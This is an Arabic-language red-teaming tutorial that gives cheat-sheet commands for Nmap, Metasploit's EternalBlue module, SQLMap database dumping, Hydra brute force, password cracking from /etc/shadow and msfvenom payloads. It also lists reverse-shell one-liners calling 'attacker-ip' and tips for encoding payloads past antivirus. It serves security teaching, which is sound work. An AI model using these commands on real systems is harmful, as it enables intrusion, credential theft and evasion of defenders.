⚔️ استراتيجيات Red Teaming الأساسية

Red Teaming (فريق الهجوم الأحمر) هو عملية محاكاة هجمات الخصوم المتقدمين لتقييم الدفاعات الأمنية للمؤسسة.

1. Reconnaissance (الاستطلاع)

جمع أكبر قدر ممكن من المعلومات عن الهدف قبل الهجوم:

  • تجميع معلومات من مصادر مفتوحة (OSINT)
  • البحث عن الموظفين والبيانات على وسائل التواصل
  • تحديد البنية التحتية وأنواع الخوادم
  • اكتشاف المجالات الفرعية والخوادم المرتبطة

2. Scanning & Enumeration (الفحص والتعداد)

البحث عن الخدمات المفتوحة والمتعرضة:

  • فحص المنافذ (Port Scanning) لتحديد الخدمات المفعلة
  • تحديد إصدارات البرامج والخدمات
  • البحث عن نقاط الضعف المعروفة
  • تجميع قائمة بالأهداف المحتملة للهجوم

3. Vulnerability Assessment (تقييم الثغرات)

تحديد والعثور على نقاط الضعف:

  • اختبار التطبيقات الويب للثغرات
  • تحليل برامج الخادم للمشاكل الأمنية
  • اختبار الحسابات الضعيفة والغير محمية
  • فحص الإعدادات الخاطئة

4. Exploitation (الاستغلال)

استغلال الثغرات المكتشفة:

  • استخدام أدوات الاستغلال المتقدمة
  • إنشاء payload مخصصة للهدف
  • محاولة الوصول الأولي للنظام
  • التعامل مع آليات الحماية والدفاعات

5. Post-Exploitation (ما بعد الاستغلال)

الحفاظ على الوصول وتعميق الاختراق:

  • تثبيت أدوات للوصول الدائم
  • الانتقال الجانبي (Lateral Movement) عبر الشبكة
  • التوسع في الامتيازات (Privilege Escalation)
  • جمع البيانات الحساسة والمعلومات المهمة

6. Exfiltration (تسرب البيانات)

نقل البيانات المسروقة بحذر:

  • التنكر عن الأنشطة المريبة
  • استخدام قنوات اتصال محفوظة
  • تقسيم البيانات لتجنب الكشف
  • تنظيف المسارات والسجلات

📚 تعلم كتابة الأوامر

1️⃣ أساسيات Terminal والـ Bash

قبل استخدام أي أداة، يجب أن تفهم أساسيات سطر الأوامر:

# التنقل بين المجلدات
cd /home/user

# عرض محتويات المجلد
ls -la

# إنشاء مجلد جديد
mkdir myfolder

# حذف ملف
rm filename.txt

# نسخ ملف
cp source.txt destination.txt

2️⃣ الأوامر الأساسية للشبكة

# معرفة عنوان IP الخاص بك
ifconfig

# اختبار اتصال الشبكة
ping google.com

# معرفة المسار إلى الخادم
traceroute google.com

# الاتصال بخادم بعيد
ssh user@192.168.1.100

3️⃣ أوامر Nmap الأساسية

# فحص بسيط للمنافذ
nmap 192.168.1.100

# فحص نطاق من الـ IPs
nmap 192.168.1.0/24

# اكتشاف الخدمات والإصدارات
nmap -sV 192.168.1.100

# فحص شامل
nmap -A -p- 192.168.1.100

4️⃣ أوامر المصادقة والصلاحيات

# التبديل إلى مستخدم الـ Root
sudo su

# تنفيذ أمر بصلاحية الـ Root
sudo nmap 192.168.1.100

# عرض صلاحيات الملف
ls -l filename.txt

# تغيير صلاحيات الملف
chmod 755 script.sh

5️⃣ نصائح مهمة للتعلم

  • ابدأ بالأساسيات: تعلم الأوامر البسيطة قبل الانتقال للمعقدة
  • استخدم Manual Pages: استخدم `man nmap` لمزيد من التفاصيل
  • التطبيق العملي: مارس على أجهزة اختبار آمنة (مثل HackTheBox)
  • فهم الـ Flags: جميع الأدوات لها خيارات (flags) مختلفة
  • التوثيق: اقرأ التوثيق الرسمية للأداة
  • التجربة والخطأ: تعلم من الأخطاء والمشاكل

🎓 الأساسيات والمفاهيم المهمة

ما هو Red Teaming؟

Red Teaming هو عملية اختبار الأمان حيث يلعب فريق "الهجوم الأحمر" دور المهاجمين الحقيقيين لتقييم الدفاعات والثغرات في أنظمة المنظمة. الهدف ليس التسبب في ضرر، بل اكتشاف الضعفيات قبل المهاجمين الفعليين.

الفرق بين Red Team و Blue Team

  • Red Team (الفريق الأحمر): يهاجم الأنظمة ويبحث عن الثغرات
  • Blue Team (الفريق الأزرق): يحافظ على الأمان والدفاع عن الأنظمة
  • Purple Team (الفريق البنفسجي): الجمع بين الاثنين لتحسين الأمان

Kali Linux - ما هو؟

Kali Linux هو توزيعة Linux متخصصة في أمان المعلومات واختبار الاختراق. تحتوي على مئات من أدوات الأمان السيبراني الجاهزة للاستخدام.

المفاهيم الأساسية:

  • الثغرة (Vulnerability): ضعف في النظام يمكن استغلاله
  • من (Threat): أي شكل من أشكال الهجوم المحتمل
  • المخاطر (Risk): احتمالية حدوث ضرر من الثغرات
  • الاستغلال (Exploitation): استخدام الثغرات للدخول غير المصرح
  • الحمولة (Payload): الأداة أو البرنامج الذي يتم تثبيته بعد الاستغلال

🔍 Nmap - فاحص المنافذ

ما هي أداة Nmap؟
Nmap هي أسطورة في عالم اختبار الاختراق. تُستخدم لفحص المنافذ واكتشاف الخدمات والتطبيقات المفتوحة على الأجهزة والشبكات.

الاستخدامات الرئيسية:

  • فحص المنافذ للتحقق من الخدمات المفعلة
  • اكتشاف الأجهزة على الشبكة
  • تحديد نوع وإصدار الخدمة
  • اكتشاف نظام التشغيل (OS Detection)
  • رسم خريطة للشبكة

الأوامر الأساسية:

# فحص بسيط
nmap 192.168.1.1

# فحص نطاق IP
nmap 192.168.1.0/24

# فحص جميع المنافذ
nmap -p- 192.168.1.1

# اكتشاف الخدمات والإصدارات
nmap -sV 192.168.1.1

# فحص نظام التشغيل
nmap -O 192.168.1.1

# فحص شامل مع التفاصيل
nmap -A -p- -sV 192.168.1.1

# حفظ النتائج
nmap -oN results.txt 192.168.1.1

أنواع الفحص:

  • TCP Scan (-sT): فحص الاتصال الكامل
  • SYN Scan (-sS): فحص سريع وسري
  • UDP Scan (-sU): فحص المنافذ UDP
  • Ping Scan (-sn): اكتشاف الأجهزة فقط

نصائح الاستخدام:

  • استخدم صلاحية الـ Root للحصول على نتائج أفضل
  • ابدأ بفحص سريع قبل الفحص الشامل
  • حفظ النتائج في ملفات للرجوع إليها لاحقاً
  • استخدم الـ Scripts للحصول على معلومات أكثر تفصيلاً

⚡ Metasploit Framework

ما هو Metasploit؟
Metasploit هو إطار عمل قوي جداً لاختبار الاختراق والاستغلال. يحتوي على آلاف من الـ exploits والـ payloads الجاهزة.

المزايا الرئيسية:

  • آلاف الـ Exploits الجاهزة للاستخدام
  • محرك قوي لاختبار الثغرات
  • إنشاء Payloads مخصصة
  • إدارة الجلسات (Sessions)
  • دعم الـ Post-Exploitation

استخدام Metasploit:

# بدء Metasploit
msfconsole

# البحث عن exploit معين
search ms17-010

# اختيار exploit
use exploit/windows/smb/ms17_010_eternalblue

# عرض الخيارات
show options

# تعيين الهدف
set RHOSTS 192.168.1.100

# تشغيل الاستغلال
run

# عرض الجلسات النشطة
sessions

# الاتصال بجلسة
sessions -i 1

أنواع الـ Payloads:

  • Reverse Shell: يعطيك Reverse shell للنظام
  • Bind Shell: يفتح منفذ على الجهاز المستهدف
  • Meterpreter: أداة متقدمة للتحكم الكامل
  • Staged Payloads: تحميل البرنامج على مراحل

نصائح حول Metasploit:

  • تحديث قاعدة البيانات بانتظام: `msfupdate`
  • التدريب على الثغرات المشهورة أولاً
  • استخدام الـ Post Scripts للاستكشاف بعد الاستغلال
  • توثيق النتائج والـ Sessions
×

🔗 Burp Suite - اختبار تطبيقات الويب

ما هو Burp Suite؟
Burp Suite هي أداة متكاملة لاختبار أمان تطبيقات الويب. تتيح لك فحص جميع جوانب التطبيق والعثور على الثغرات.

المزايا الرئيسية:

  • اعتراض طلبات الويب (Proxy)
  • اختبار SQL Injection و XSS
  • فحص تطبيقات الويب تلقائياً
  • اختبار المصادقة والمزج (Authentication)
  • تحليل Response والـ Headers

خطوات الاستخدام الأساسية:

# 1. فتح Burp Suite
burpsuite

# 2. إعداد المتصفح ليستخدم Burp Proxy
Browser Proxy: 127.0.0.1:8080

# 3. الدخول للموقع المراد اختباره
https://target-website.com

# 4. اعتراض الطلبات في Proxy
Forward/Drop الطلبات

# 5. تحليل الطلبات والـ Responses
البحث عن نقاط الضعف

أنواع الهجمات المختبرة:

  • SQL Injection: حقن قواعد البيانات
  • XSS: حقن JavaScript أو HTML
  • CSRF: Cross-Site Request Forgery
  • Broken Authentication: مشاكل المصادقة
  • Sensitive Data Exposure: تسرب البيانات الحساسة

نصائح الاستخدام:

  • استخدم Burp Suite مع متصفح منفصل
  • حفظ جميع الطلبات والـ Responses
  • تجنب إرسال طلبات خطيرة للمواقع الحقيقية
  • استخدم بيئة اختبار آمنة
×

📊 Wireshark - محلل حزم الشبكة

ما هو Wireshark؟
Wireshark هي أداة قوية لالتقاط وتحليل حزم الشبكة. تسمح لك برؤية جميع البيانات المرسلة والمستقبلة على الشبكة.

الاستخدامات الرئيسية:

  • التقاط البيانات المرسلة على الشبكة
  • تحليل البروتوكولات المختلفة
  • اكتشاف المشاكل في الشبكة
  • مراقبة الاتصالات غير الآمنة
  • استخراج البيانات الحساسة (كلمات المرور، الرسائل إلخ)

الأوامر الأساسية:

# بدء التقاط الحزم على جميع الواجهات
wireshark

# التقاط من واجهة معينة
wireshark -i eth0

# بدء التقاط مباشرة بدون الواجهة الرسومية
tcpdump -i eth0 -w capture.pcap

# عرض الحزم المسجلة
tcpdump -r capture.pcap

# تصفية TCP فقط
tcpdump -i eth0 tcp

أنواع التصفية (Filters):

  • ip.addr == 192.168.1.1 - حزم معينة من IP
  • tcp.port == 80 - حزم منفذ معين
  • http - حزم HTTP فقط
  • ssl.handshake - بيانات التشفير
  • dns - استعلامات DNS

نصائح الاستخدام:

  • استخدم الصلاحيات المرتفعة للتقاط كامل البيانات
  • حفظ الملفات المسجلة في ملفات .pcap
  • استخدم التصفية لتقليل كمية البيانات
  • تحليل البروتوكولات غير المشفرة بحذر
×

📡 Aircrack-ng - اختبار الشبكات اللاسلكية

ما هو Aircrack-ng؟
Aircrack-ng هي مجموعة من الأدوات لاختبار أمان الشبكات اللاسلكية (WiFi). تتيح اختبار مستويات التشفير والثغرات الأمنية.

الاستخدامات الرئيسية:

  • اكتشاف الشبكات اللاسلكية
  • التقاط بيانات handshake من WiFi
  • اختبار قوة كلمات المرور
  • فك تشفير WEP و WPA/WPA2
  • اختبار المصادقة اللاسلكية

أوامر Aircrack-ng:

# تشغيل الواجهة في Monitor Mode
sudo airmon-ng start wlan0

# البحث عن الشبكات اللاسلكية
sudo airodump-ng wlan0mon

# التقاط حركة الشبكة
sudo airodump-ng -c 6 -b xx:xx:xx:xx:xx:xx -w capture wlan0mon

# اختبار WPA/WPA2
sudo aircrack-ng -w wordlist.txt -b xx:xx:xx:xx:xx:xx capture.cap

# فك تشفير WEP
sudo aircrack-ng capture.cap

الخطوات الأساسية:

  • 1. تفعيل Monitor Mode على الواجهة اللاسلكية
  • 2. البحث عن الشبكات المتاحة
  • 3. اختيار الشبكة المراد اختبارها
  • 4. التقاط البيانات العائمة
  • 5. محاولة فك التشفير

نصائح الاستخدام:

  • استخدم هذه الأدوات على شبكتك الخاصة فقط
  • قد تحتاج لكرت wifi متقدم يدعم Monitor Mode
  • جمع كمية كافية من البيانات قبل الاختبار
  • استخدم قوامس كلمات مرور قوية
×

🔑 John the Ripper - فك تشفير كلمات المرور

ما هو John the Ripper؟
John the Ripper هي أداة قوية لفك تشفير الهاشات وكسر كلمات المرور. تستخدم تقنيات مختلفة مثل القوة الغاشمة والقواميس.

الاستخدامات الرئيسية:

  • فك تشفير هاشات الكلمات
  • اختبار قوة كلمات المرور
  • فك تشفير ملفات ZIP و RAR
  • فك تشفير حسابات نظام التشغيل
  • اختبار كلمات المرور في قاعدة البيانات

أوامر John الأساسية:

# فك تشفير بسيط مع قاموس
john --wordlist=wordlist.txt hashes.txt

# تحديد نوع الهاش
john --format=md5 --wordlist=wordlist.txt hashes.txt

# القوة الغاشمة
john --format=md5 hashes.txt

# عرض كلمات المرور المكتشفة
john --show hashes.txt

# استخراج الهاشات من النظام
sudo unshadow /etc/passwd /etc/shadow > hash.txt

# فك تشفير مع تخصيص الإعدادات
john -i=incremental hashes.txt

أنواع الهاشات المدعومة:

  • MD5 - هاش بسيط 128 بت
  • SHA1 - هاش 160 بت
  • SHA256/SHA512 - هاشات آمنة
  • bcrypt - هاش آمن للكلمات
  • LM Hash - نظام Windows القديم

نصائح الاستخدام:

  • استخدم قواميس كبيرة وقوية
  • تفعيل GPU Processing إن أمكن
  • ابدأ برموز بسيطة قبل المعقدة
  • استخدم Rules لتوليد مزيجات من الكلمات
×

💾 SQLMap - اختبار SQL Injection

ما هو SQLMap؟
SQLMap هي أداة آلية للكشف والاستغلال عن ثغرات SQL Injection في تطبيقات الويب.

الاستخدامات الرئيسية:

  • اكتشاف ثغرات SQL Injection
  • استخراج البيانات من قاعدة البيانات
  • الوصول لملفات النظام
  • تنفيذ أوامر على الخادم
  • الملء التلقائي للبيانات الحساسة

أوامر SQLMap:

# اختبار بسيط على URL
sqlmap -u "http://target.com/page.php?id=1"

# اختبار مع POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=admin"

# استخراج قاعدة البيانات
sqlmap -u "http://target.com/page.php?id=1" --dbs

# استخراج الجداول
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# استخراج البيانات
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump

أنواع SQL Injection:

  • Error-based: الاعتماد على رسائل الخطأ
  • Union-based: استخدام UNION في SQL
  • Blind SQL Injection: بدون رسائل خطأ
  • Time-based Blind: الاعتماد على الوقت

نصائح الاستخدام:

  • استخدم على المواقع التي لديك تصريح اختبارها فقط
  • ابدأ بــ URL بسيط قبل الذهاب للمعقد
  • استخدم Burp Suite لاختيار الطلبات الصحيحة
  • حفظ النتائج للتقرير
×

🌊 Hydra - هجمات القوة الغاشمة

ما هو Hydra؟
Hydra هي أداة سريعة وفعالة لتنفيذ هجمات القوة الغاشمة على خدمات مختلفة (SSH, FTP, HTTP, إلخ).

الاستخدامات الرئيسية:

  • اختبار ضعف كلمات المرور
  • الهجوم على خدمات SSH و FTP
  • اختبار المصادقة في تطبيقات الويب
  • الهجوم على VPN و RDP
  • اختبار قواعد المصادقة المختلفة

أوامر Hydra:

# هجوم على SSH
hydra -l username -P wordlist.txt ssh://192.168.1.100

# هجوم على FTP
hydra -l admin -P wordlist.txt ftp://192.168.1.100

# هجوم على HTTP (Form)
hydra -l admin -P wordlist.txt http-post-form://target.com/login.php:user=^USER^&pass=^PASS^:F=invalid

# محاولات متعددة بسرعة
hydra -l user -P wordlist.txt -t 4 ssh://192.168.1.100

# استخدام اسماء مستخدمين متعددة
hydra -L usernames.txt -P wordlist.txt ssh://192.168.1.100

الخدمات المدعومة:

  • SSH - Secure Shell
  • FTP - File Transfer Protocol
  • HTTP - Web Forms
  • RDP - Remote Desktop
  • VNC - Virtual Network Computing
  • IMAP/SMTP - Email Services

نصائح الاستخدام:

  • استخدم قواميس قوية وكبيرة
  • ابدأ بقواامس شهيرة قبل الورد lists الضخمة
  • كن حذراً من الحسابات المقفولة بعد عدة محاولات
  • استخدم -t لتعديل عدد المحاولات المتزامنة

⚙️ Hashcat - فك تشفير الهاشات بقوة GPU

ما هو Hashcat؟
Hashcat هي أداة متقدمة لفك تشفير الهاشات باستخدام قوة بطاقة الرسوميات (GPU)، مما يجعلها أسرع بكثير من John the Ripper.

الاستخدامات الرئيسية:

  • فك تشفير الهاشات بسرعة عالية
  • دعم مئات أنواع الهاشات
  • القوة الغاشمة والقواامس
  • قواعد مخصصة (Rules)
  • الهجمات الهجينة

أوامر Hashcat:

# فك تشفير MD5 مع قاموس
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# فك تشفير SHA1
hashcat -m 100 -a 0 hashes.txt wordlist.txt

# القوة الغاشمة
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a

# مع Rules
hashcat -m 0 -a 0 -r rules/best64.rule hashes.txt wordlist.txt

# عرض الأجهزة المتاحة
hashcat -I

# حفظ النتائج
hashcat -m 0 -a 0 hashes.txt wordlist.txt --outfile=results.txt

أنماط الهجوم:

  • -a 0: Dictionary Attack (القاموس)
  • -a 1: Combination (دمج القواميس)
  • -a 3: Brute Force (القوة الغاشمة)
  • -a 6: Hybrid (هجوم هجين)

نصائح الاستخدام:

  • تأكد من تثبيت برامج تشغيل GPU بشكل صحيح
  • استخدم -I للتحقق من دعم GPU
  • حفظ الجلسات باستخدام checkpoint
  • استخدم قواعل مخصصة لزيادة فرص النجاح

🎯 Payloads - بناء الحمولات المخصصة

ما هي Payloads؟
Payloads هي البرامج أو الأوامر التي يتم تنفيذها على النظام المستهدف بعد الاستغلال بنجاح.

أنواع الـ Payloads:

  • Reverse Shell: اتصال عكسي للتحكم الكامل
  • Bind Shell: فتح منفذ على الجهاز المستهدف
  • Meterpreter: أداة متقدمة للانطلاق التفاعلي
  • One-liners: أوامر بسيطة في سطر واحد
  • Custom Payloads: حمولات مخصصة

بناء Payloads مع msfvenom:

# Reverse Shell بسيط
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Linux Reverse Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# PHP Reverse Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

# PowerShell Reverse Shell
msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh

# عرض الخيارات
msfvenom -p windows/meterpreter/reverse_tcp --list-options

أشهر Reverse Shells:

  • nc (netcat): `nc -e /bin/sh attacker-ip 4444`
  • bash: `bash -i >& /dev/tcp/ip/port 0>&1`
  • python: `python -c 'import socket,...'`
  • perl: `perl -e 'use Socket;...'`
  • ruby: `ruby -rsocket -e 'c=Socket.new...'`

نصائح آمنة الاستخدام:

  • استخدم على أجهزة اختبار فقط
  • قم بتشفير الـ Payloads لتجنب الكشف
  • استخدم Encoding لتجاوز الـ Antivirus
  • احتفظ بنسخة احتياطية من الـ Payloads

🚀 Gobuster - اكتشاف المجلدات والملفات

ما هو Gobuster؟
Gobuster هي أداة سريعة لاكتشاف المجلدات والملفات المخفية في تطبيقات الويب.

الاستخدامات الرئيسية:

  • اكتشاف المسارات المخفية
  • البحث عن ملفات الإدارة
  • اكتشاف Domain Subdomains
  • تجميع معلومات الموقع
  • البحث عن أسماء المستخدمين

أوامر Gobuster:

# اكتشاف المجلدات
gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt

# اكتشاف المجلدات بـ extensions معينة
gobuster dir -u http://target.com -w wordlist.txt -x .php,.html,.js

# Subdomain Enumeration
gobuster dns -d target.com -w subdomains.txt

# مع Proxy وحقن Headers
gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Bearer token"

# مع سرعة معينة
gobuster dir -u http://target.com -w wordlist.txt -t 50

مصادر Wordlists:

  • /usr/share/wordlists/ - قاموامس Kali
  • SecLists Github - قاموامس شاملة
  • dirb wordlists - قاموامس مشهورة

نصائح الاستخدام:

  • استخدم قاموس مناسب لنوع الموقع
  • احذر من الـ False Positives
  • استخدم Proxy من أجل تصفية أفضل
  • حفظ النتائج المهمة

🔐 SSH Tools - أدوات الاتصال الآمن

ما هو SSH؟
SSH (Secure Shell) هو بروتوكول آمن للاتصال بأجهزة بعيدة. أداة قوية للـ Remote Administration والـ File Transfer.

الاستخدامات الرئيسية:

  • الاتصال الآمن بالأجهزة البعيدة
  • نقل الملفات بأمان (SCP, SFTP)
  • إنشاء Tunnels آمنة
  • تنفيذ الأوامر البعيدة
  • إدارة الخوادم

أوامر SSH الأساسية:

# الاتصال البسيط
ssh username@192.168.1.100

# الاتصال على منفذ مختخلف
ssh -p 2222 username@192.168.1.100

# نقل ملف من الجهاز البعيد
scp username@192.168.1.100:/path/file.txt ./local

# نقل ملف إلى الجهاز البعيد
scp ./file.txt username@192.168.1.100:/path/

# إنشاء SSH Key
ssh-keygen -t rsa -f ~/.ssh/id_rsa

# Forward Port
ssh -L 8080:localhost:80 username@192.168.1.100

# Dynamic Proxy
ssh -D 9050 username@192.168.1.100

أفضل الممارسات الأمنية:

  • استخدم SSH Keys بدلاً من كلمات المرور
  • عطل المصادقة بكلمة المرور إن أمكن
  • غيّر رقم المنفذ من 22 إلى رقم آخر
  • استخدم Firewall لتقييد الوصول
  • حدّث SSH بانتظام

نصائح الاستخدام:

  • احفظ Keys بأمان واطلب كلمة مرور قوية
  • استخدم ssh-agent لإدارة المفاتيح
  • اختبر الاتصال قبل الاستخدام في الإنتاج
  • راقب سجلات SSH للنشاط المريب
